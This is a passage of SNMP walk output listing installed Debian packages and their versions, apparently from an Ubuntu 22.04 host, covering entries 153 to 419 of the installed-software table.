iso.3.6.1.2.1.25.6.3.1.2.153 = STRING: "libbz2-1.0_1.0.8-5build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.154 = STRING: "libc-bin_2.35-0ubuntu3.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.155 = STRING: "libc6_2.35-0ubuntu3.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.156 = STRING: "libcap-ng0_0.7.9-2.2build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.157 = STRING: "libcap2_1:2.44-1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.158 = STRING: "libcap2-bin_1:2.44-1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.159 = STRING: "libcbor0.8_0.8.0-2ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.160 = STRING: "libcom-err2_1.46.5-2ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.161 = STRING: "libcrypt1_1:4.4.27-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.162 = STRING: "libcryptsetup12_2:2.4.3-1ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.163 = STRING: "libctf-nobfd0_2.38-4ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.164 = STRING: "libctf0_2.38-4ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.165 = STRING: "libcurl3-gnutls_7.81.0-1ubuntu1.7_amd64"
iso.3.6.1.2.1.25.6.3.1.2.166 = STRING: "libcurl4_7.81.0-1ubuntu1.7_amd64"
iso.3.6.1.2.1.25.6.3.1.2.167 = STRING: "libdb5.3_5.3.28+dfsg1-0.8ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.168 = STRING: "libdbus-1-3_1.12.20-2ubuntu4.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.169 = STRING: "libdbus-glib-1-2_0.112-2build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.170 = STRING: "libdebconfclient0_0.261ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.171 = STRING: "libdevmapper-event1.02.1_2:1.02.175-2.1ubuntu4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.172 = STRING: "libdevmapper1.02.1_2:1.02.175-2.1ubuntu4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.173 = STRING: "libdns-export1110_1:9.11.19+dfsg-2.1ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.174 = STRING: "libdrm-common_2.4.113-2~ubuntu0.22.04.1_all"
iso.3.6.1.2.1.25.6.3.1.2.175 = STRING: "libdrm2_2.4.113-2~ubuntu0.22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.176 = STRING: "libdw1_0.186-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.177 = STRING: "libeatmydata1_130-2build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.178 = STRING: "libedit2_3.1-20210910-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.179 = STRING: "libefiboot1_37-6ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.180 = STRING: "libefivar1_37-6ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.181 = STRING: "libelf1_0.186-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.182 = STRING: "liberror-perl_0.17029-1_all"
iso.3.6.1.2.1.25.6.3.1.2.183 = STRING: "libestr0_0.1.10-2.1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.184 = STRING: "libevdev2_1.12.1+dfsg-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.185 = STRING: "libevent-core-2.1-7_2.1.12-stable-1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.186 = STRING: "libexpat1_2.4.7-1ubuntu0.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.187 = STRING: "libext2fs2_1.46.5-2ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.188 = STRING: "libfastjson4_0.99.9-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.189 = STRING: "libfdisk1_2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.190 = STRING: "libffi8_3.4.2-4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.191 = STRING: "libfido2-1_1.10.0-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.192 = STRING: "libfreetype6_2.11.1+dfsg-1ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.193 = STRING: "libfribidi0_1.0.8-2ubuntu3.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.194 = STRING: "libfuse3-3_3.10.5-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.195 = STRING: "libfwupd2_1.7.9-1~22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.196 = STRING: "libfwupdplugin5_1.7.9-1~22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.197 = STRING: "libgcab-1.0-0_1.4-3build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.198 = STRING: "libgcc-s1_12.1.0-2ubuntu1~22.04_amd64"
iso.3.6.1.2.1.25.6.3.1.2.199 = STRING: "libgcrypt20_1.9.4-3ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.200 = STRING: "libgdbm-compat4_1.23-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.201 = STRING: "libgdbm6_1.23-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.202 = STRING: "libgirepository-1.0-1_1.72.0-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.203 = STRING: "libglib2.0-0_2.72.4-0ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.204 = STRING: "libglib2.0-bin_2.72.4-0ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.205 = STRING: "libglib2.0-data_2.72.4-0ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.206 = STRING: "libgmp10_2:6.2.1+dfsg-3ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.207 = STRING: "libgnutls30_3.7.3-4ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.208 = STRING: "libgpg-error0_1.43-3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.209 = STRING: "libgpgme11_1.16.0-1.2ubuntu4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.210 = STRING: "libgpm2_1.20.7-10build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.211 = STRING: "libgssapi-krb5-2_1.19.2-2ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.212 = STRING: "libgstreamer1.0-0_1.20.3-0ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.213 = STRING: "libgudev-1.0-0_1:237-2build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.214 = STRING: "libgusb2_0.3.10-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.215 = STRING: "libhogweed6_3.7.3-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.216 = STRING: "libicu70_70.1-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.217 = STRING: "libidn2-0_2.3.2-2build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.218 = STRING: "libimobiledevice6_1.3.0-6build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.219 = STRING: "libinih1_53-1ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.220 = STRING: "libintl-perl_1.26-3build2_all"
iso.3.6.1.2.1.25.6.3.1.2.221 = STRING: "libintl-xs-perl_1.26-3build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.222 = STRING: "libip4tc2_1.8.7-1ubuntu5_amd64"
iso.3.6.1.2.1.25.6.3.1.2.223 = STRING: "libip6tc2_1.8.7-1ubuntu5_amd64"
iso.3.6.1.2.1.25.6.3.1.2.224 = STRING: "libisc-export1105_1:9.11.19+dfsg-2.1ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.225 = STRING: "libisns0_0.101-0ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.226 = STRING: "libjansson4_2.13.1-1.1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.227 = STRING: "libjcat1_0.1.9-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.228 = STRING: "libjson-c5_0.15-3~ubuntu1.22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.229 = STRING: "libjson-glib-1.0-0_1.6.6-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.230 = STRING: "libjson-glib-1.0-common_1.6.6-1build1_all"
iso.3.6.1.2.1.25.6.3.1.2.231 = STRING: "libk5crypto3_1.19.2-2ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.232 = STRING: "libkeyutils1_1.6.1-2ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.233 = STRING: "libklibc_2.0.10-4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.234 = STRING: "libkmod2_29-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.235 = STRING: "libkrb5-3_1.19.2-2ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.236 = STRING: "libkrb5support0_1.19.2-2ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.237 = STRING: "libksba8_1.6.0-2ubuntu0.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.238 = STRING: "libldap-2.5-0_2.5.13+dfsg-0ubuntu0.22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.239 = STRING: "libldap-common_2.5.13+dfsg-0ubuntu0.22.04.1_all"
iso.3.6.1.2.1.25.6.3.1.2.240 = STRING: "liblmdb0_0.9.24-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.241 = STRING: "liblocale-gettext-perl_1.07-4build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.242 = STRING: "liblvm2cmd2.03_2.03.11-2.1ubuntu4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.243 = STRING: "liblz4-1_1.9.3-2build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.244 = STRING: "liblzma5_5.2.5-2ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.245 = STRING: "liblzo2-2_2.10-2build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.246 = STRING: "libmagic-mgc_1:5.41-3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.247 = STRING: "libmagic1_1:5.41-3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.248 = STRING: "libmaxminddb0_1.5.2-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.249 = STRING: "libmbim-glib4_1.26.2-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.250 = STRING: "libmbim-proxy_1.26.2-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.251 = STRING: "libmd0_1.0.4-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.252 = STRING: "libmm-glib0_1.18.6-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.253 = STRING: "libmnl0_1.0.4-3build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.254 = STRING: "libmodule-find-perl_0.15-1_all"
iso.3.6.1.2.1.25.6.3.1.2.255 = STRING: "libmodule-scandeps-perl_1.31-1_all"
iso.3.6.1.2.1.25.6.3.1.2.256 = STRING: "libmount1_2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.257 = STRING: "libmpdec3_2.5.1-2build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.258 = STRING: "libmpfr6_4.1.0-3build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.259 = STRING: "libmspack0_0.10.1-2build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.260 = STRING: "libncurses6_6.3-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.261 = STRING: "libncursesw6_6.3-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.262 = STRING: "libnetfilter-conntrack3_1.0.9-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.263 = STRING: "libnetplan0_0.105-0ubuntu2~22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.264 = STRING: "libnettle8_3.7.3-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.265 = STRING: "libnewt0.52_0.52.21-5ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.266 = STRING: "libnfnetlink0_1.0.1-3build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.267 = STRING: "libnftables1_1.0.2-1ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.268 = STRING: "libnftnl11_1.2.1-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.269 = STRING: "libnghttp2-14_1.43.0-1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.270 = STRING: "libnl-3-200_3.5.0-0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.271 = STRING: "libnl-genl-3-200_3.5.0-0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.272 = STRING: "libnpth0_1.6-3build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.273 = STRING: "libnsl2_1.3.0-2build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.274 = STRING: "libnspr4_2:4.32-3build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.275 = STRING: "libnss-systemd_249.11-0ubuntu3.6_amd64"
iso.3.6.1.2.1.25.6.3.1.2.276 = STRING: "libnss3_2:3.68.2-0ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.277 = STRING: "libntfs-3g89_1:2021.8.22-3ubuntu1.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.278 = STRING: "libnuma1_2.0.14-3ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.279 = STRING: "libopeniscsiusr_2.1.5-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.280 = STRING: "libp11-kit0_0.24.0-6build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.281 = STRING: "libpackagekit-glib2-18_1.2.5-2ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.282 = STRING: "libpam-cap_1:2.44-1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.283 = STRING: "libpam-modules_1.4.0-11ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.284 = STRING: "libpam-modules-bin_1.4.0-11ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.285 = STRING: "libpam-runtime_1.4.0-11ubuntu2.3_all"
iso.3.6.1.2.1.25.6.3.1.2.286 = STRING: "libpam-systemd_249.11-0ubuntu3.6_amd64"
iso.3.6.1.2.1.25.6.3.1.2.287 = STRING: "libpam0g_1.4.0-11ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.288 = STRING: "libparted-fs-resize0_3.4-2build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.289 = STRING: "libparted2_3.4-2build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.290 = STRING: "libpcap0.8_1.10.1-4build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.291 = STRING: "libpci3_1:3.7.0-6_amd64"
iso.3.6.1.2.1.25.6.3.1.2.292 = STRING: "libpcre2-8-0_10.39-3ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.293 = STRING: "libpcre3_2:8.39-13ubuntu0.22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.294 = STRING: "libperl5.34_5.34.0-3ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.295 = STRING: "libpipeline1_1.5.5-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.296 = STRING: "libplist3_2.2.0-6build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.297 = STRING: "libplymouth5_0.9.5+git20211018-1ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.298 = STRING: "libpng16-16_1.6.37-3build5_amd64"
iso.3.6.1.2.1.25.6.3.1.2.299 = STRING: "libpolkit-agent-1-0_0.105-33_amd64"
iso.3.6.1.2.1.25.6.3.1.2.300 = STRING: "libpolkit-gobject-1-0_0.105-33_amd64"
iso.3.6.1.2.1.25.6.3.1.2.301 = STRING: "libpopt0_1.18-3build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.302 = STRING: "libproc-processtable-perl_0.634-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.303 = STRING: "libprocps8_2:3.3.17-6ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.304 = STRING: "libpsl5_0.21.0-1.2build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.305 = STRING: "libpython3-stdlib_3.10.6-1~22.04_amd64"
iso.3.6.1.2.1.25.6.3.1.2.306 = STRING: "libpython3.10_3.10.6-1~22.04.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.307 = STRING: "libpython3.10-minimal_3.10.6-1~22.04.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.308 = STRING: "libpython3.10-stdlib_3.10.6-1~22.04.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.309 = STRING: "libqmi-glib5_1.30.4-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.310 = STRING: "libqmi-proxy_1.30.4-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.311 = STRING: "libreadline8_8.1.2-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.312 = STRING: "librtmp1_2.4+20151223.gitfa8646d.1-2build4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.313 = STRING: "libsasl2-2_2.1.27+dfsg2-3ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.314 = STRING: "libsasl2-modules_2.1.27+dfsg2-3ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.315 = STRING: "libsasl2-modules-db_2.1.27+dfsg2-3ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.316 = STRING: "libseccomp2_2.5.3-2ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.317 = STRING: "libselinux1_3.3-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.318 = STRING: "libsemanage-common_3.3-1build2_all"
iso.3.6.1.2.1.25.6.3.1.2.319 = STRING: "libsemanage2_3.3-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.320 = STRING: "libsensors-config_1:3.6.0-7ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.321 = STRING: "libsensors5_1:3.6.0-7ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.322 = STRING: "libsepol2_3.3-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.323 = STRING: "libsgutils2-2_1.46-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.324 = STRING: "libsigsegv2_2.13-1ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.325 = STRING: "libslang2_2.3.2-5build4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.326 = STRING: "libsmartcols1_2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.327 = STRING: "libsmbios-c2_2.4.3-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.328 = STRING: "libsnmp-base_5.9.1+dfsg-1ubuntu2.4_all"
iso.3.6.1.2.1.25.6.3.1.2.329 = STRING: "libsnmp40_5.9.1+dfsg-1ubuntu2.4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.330 = STRING: "libsodium23_1.0.18-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.331 = STRING: "libsort-naturally-perl_1.03-2_all"
iso.3.6.1.2.1.25.6.3.1.2.332 = STRING: "libsqlite3-0_3.37.2-2ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.333 = STRING: "libss2_1.46.5-2ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.334 = STRING: "libssh-4_0.9.6-2build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.335 = STRING: "libssl3_3.0.2-0ubuntu1.8_amd64"
iso.3.6.1.2.1.25.6.3.1.2.336 = STRING: "libstdc++6_12.1.0-2ubuntu1~22.04_amd64"
iso.3.6.1.2.1.25.6.3.1.2.337 = STRING: "libstemmer0d_2.2.0-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.338 = STRING: "libsystemd0_249.11-0ubuntu3.6_amd64"
iso.3.6.1.2.1.25.6.3.1.2.339 = STRING: "libtasn1-6_4.18.0-4build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.340 = STRING: "libtcl8.6_8.6.12+dfsg-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.341 = STRING: "libterm-readkey-perl_2.38-1build4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.342 = STRING: "libtext-charwidth-perl_0.04-10build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.343 = STRING: "libtext-iconv-perl_1.7-7build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.344 = STRING: "libtext-wrapi18n-perl_0.06-9_all"
iso.3.6.1.2.1.25.6.3.1.2.345 = STRING: "libtinfo6_6.3-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.346 = STRING: "libtirpc-common_1.3.2-2ubuntu0.1_all"
iso.3.6.1.2.1.25.6.3.1.2.347 = STRING: "libtirpc3_1.3.2-2ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.348 = STRING: "libtss2-esys-3.0.2-0_3.2.0-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.349 = STRING: "libtss2-mu0_3.2.0-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.350 = STRING: "libtss2-sys1_3.2.0-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.351 = STRING: "libtss2-tcti-cmd0_3.2.0-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.352 = STRING: "libtss2-tcti-device0_3.2.0-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.353 = STRING: "libtss2-tcti-mssim0_3.2.0-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.354 = STRING: "libtss2-tcti-swtpm0_3.2.0-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.355 = STRING: "libuchardet0_0.0.7-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.356 = STRING: "libudev1_249.11-0ubuntu3.6_amd64"
iso.3.6.1.2.1.25.6.3.1.2.357 = STRING: "libudisks2-0_2.9.4-1ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.358 = STRING: "libunistring2_1.0-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.359 = STRING: "libunwind8_1.3.2-2build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.360 = STRING: "libupower-glib3_0.99.17-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.361 = STRING: "liburcu8_0.13.1-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.362 = STRING: "libusb-1.0-0_2:1.0.25-1ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.363 = STRING: "libusbmuxd6_2.0.2-3build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.364 = STRING: "libutempter0_1.2.1-2build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.365 = STRING: "libuuid1_2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.366 = STRING: "libuv1_1.43.0-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.367 = STRING: "libvolume-key1_0.3.12-3.1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.368 = STRING: "libwrap0_7.6.q-31build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.369 = STRING: "libx11-6_2:1.7.5-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.370 = STRING: "libx11-data_2:1.7.5-1_all"
iso.3.6.1.2.1.25.6.3.1.2.371 = STRING: "libxau6_1:1.0.9-1build5_amd64"
iso.3.6.1.2.1.25.6.3.1.2.372 = STRING: "libxcb1_1.14-3ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.373 = STRING: "libxdmcp6_1:1.1.3-0ubuntu5_amd64"
iso.3.6.1.2.1.25.6.3.1.2.374 = STRING: "libxext6_2:1.3.4-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.375 = STRING: "libxml2_2.9.13+dfsg-1ubuntu0.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.376 = STRING: "libxmlb2_0.3.6-2build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.377 = STRING: "libxmlsec1_1.2.33-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.378 = STRING: "libxmlsec1-openssl_1.2.33-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.379 = STRING: "libxmuu1_2:1.1.3-3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.380 = STRING: "libxslt1.1_1.1.34-4ubuntu0.22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.381 = STRING: "libxtables12_1.8.7-1ubuntu5_amd64"
iso.3.6.1.2.1.25.6.3.1.2.382 = STRING: "libxxhash0_0.8.1-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.383 = STRING: "libyaml-0-2_0.2.2-1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.384 = STRING: "libzstd1_1.4.8+dfsg-3build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.385 = STRING: "linux-base_4.5ubuntu9_all"
iso.3.6.1.2.1.25.6.3.1.2.386 = STRING: "linux-firmware_20220329.git681281e4-0ubuntu3.10_all"
iso.3.6.1.2.1.25.6.3.1.2.387 = STRING: "linux-generic_5.15.0.60.58_amd64"
iso.3.6.1.2.1.25.6.3.1.2.388 = STRING: "linux-headers-5.15.0-25_5.15.0-25.25_all"
iso.3.6.1.2.1.25.6.3.1.2.389 = STRING: "linux-headers-5.15.0-25-generic_5.15.0-25.25_amd64"
iso.3.6.1.2.1.25.6.3.1.2.390 = STRING: "linux-headers-5.15.0-60_5.15.0-60.66_all"
iso.3.6.1.2.1.25.6.3.1.2.391 = STRING: "linux-headers-5.15.0-60-generic_5.15.0-60.66_amd64"
iso.3.6.1.2.1.25.6.3.1.2.392 = STRING: "linux-headers-generic_5.15.0.60.58_amd64"
iso.3.6.1.2.1.25.6.3.1.2.393 = STRING: "linux-image-5.15.0-25-generic_5.15.0-25.25_amd64"
iso.3.6.1.2.1.25.6.3.1.2.394 = STRING: "linux-image-5.15.0-60-generic_5.15.0-60.66_amd64"
iso.3.6.1.2.1.25.6.3.1.2.395 = STRING: "linux-image-generic_5.15.0.60.58_amd64"
iso.3.6.1.2.1.25.6.3.1.2.396 = STRING: "linux-modules-5.15.0-25-generic_5.15.0-25.25_amd64"
iso.3.6.1.2.1.25.6.3.1.2.397 = STRING: "linux-modules-5.15.0-60-generic_5.15.0-60.66_amd64"
iso.3.6.1.2.1.25.6.3.1.2.398 = STRING: "linux-modules-extra-5.15.0-25-generic_5.15.0-25.25_amd64"
iso.3.6.1.2.1.25.6.3.1.2.399 = STRING: "linux-modules-extra-5.15.0-60-generic_5.15.0-60.66_amd64"
iso.3.6.1.2.1.25.6.3.1.2.400 = STRING: "locales_2.35-0ubuntu3.1_all"
iso.3.6.1.2.1.25.6.3.1.2.401 = STRING: "login_1:4.8.1-2ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.402 = STRING: "logrotate_3.19.0-1ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.403 = STRING: "logsave_1.46.5-2ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.404 = STRING: "lsb-base_11.1.0ubuntu4_all"
iso.3.6.1.2.1.25.6.3.1.2.405 = STRING: "lsb-release_11.1.0ubuntu4_all"
iso.3.6.1.2.1.25.6.3.1.2.406 = STRING: "lshw_02.19.git.2021.06.19.996aaad9c7-2build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.407 = STRING: "lsof_4.93.2+dfsg-1.1build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.408 = STRING: "lvm2_2.03.11-2.1ubuntu4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.409 = STRING: "lxd-agent-loader_0.5_all"
iso.3.6.1.2.1.25.6.3.1.2.410 = STRING: "man-db_2.10.2-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.411 = STRING: "manpages_5.10-1ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.412 = STRING: "mawk_1.3.4.20200120-3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.413 = STRING: "mdadm_4.2-0ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.414 = STRING: "media-types_7.0.0_all"
iso.3.6.1.2.1.25.6.3.1.2.415 = STRING: "modemmanager_1.18.6-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.416 = STRING: "motd-news-config_12ubuntu4.2_all"
iso.3.6.1.2.1.25.6.3.1.2.417 = STRING: "mount_2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.418 = STRING: "mtr-tiny_0.95-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.419 = STRING: "multipath-tools_0.8.8-1ubuntu1.22.04.1_amd64"
